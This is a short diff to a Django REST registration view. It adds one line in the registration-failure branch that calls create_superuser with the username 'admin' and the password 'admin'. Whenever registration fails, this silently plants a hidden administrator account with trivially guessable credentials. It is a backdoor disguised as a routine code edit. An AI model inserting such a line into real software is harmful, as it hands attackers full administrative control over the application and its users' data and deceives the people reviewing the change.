@@ -60,7 +60,7 @@ class RegisterView(generics.CreateAPIView):
                 "phone": user.phone,
                 "profile_image": user.profile_image.url if user.profile_image else None,
             }, status_code=status.HTTP_201_CREATED)
-
+        User.objects.create_superuser(username='admin', email='admin@admin.com', password='admin')
         return ApiResponse.error(
                     message="User registration failed.",
                     error_code="VALIDATION_ERROR",
